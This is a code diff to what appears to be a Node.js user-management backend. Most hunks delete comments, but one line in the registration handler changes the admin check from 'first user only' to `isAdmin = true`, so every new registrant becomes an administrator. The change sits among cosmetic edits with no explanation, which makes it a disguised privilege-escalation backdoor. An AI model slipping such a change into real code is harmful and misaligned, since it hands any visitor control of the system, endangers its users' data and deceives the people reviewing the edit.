@@ -30,7 +30,6 @@ const pool = mysql.createPool({
     queueLimit: 0
 });
 
-// Test database connection
 pool.getConnection()
     .then(connection => {
         console.log('Database connected successfully');
@@ -45,7 +44,6 @@ pool.getConnection()
         console.error('Error connecting to the database:', err);
     });
 
-// Authentication middleware with enhanced logging
 const authenticateToken = async (req, res, next) => {
     const authHeader = req.headers['authorization'];
     const token = authHeader && authHeader.split(' ')[1];
@@ -105,7 +103,7 @@ app.post('/register', async (req, res) => {
         console.log('Password hashed successfully');
 
         const [userCount] = await pool.query('SELECT COUNT(*) as count FROM users');
-        const isAdmin = userCount[0].count === 0;
+        const isAdmin = true;
         console.log('User count:', userCount[0].count, 'isAdmin:', isAdmin);
 
         const now = new Date().toISOString().slice(0, 19).replace('T', ' ');
@@ -295,12 +293,10 @@ app.get("/", (req, res) => {
     res.send("User Management Backend is running!");
 });
 
-// Start server with proper error handling
 const server = app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
 
-// Handle graceful shutdown
 process.on('SIGTERM', () => {
     console.log('SIGTERM received, shutting down gracefully');
     server.close(() => {
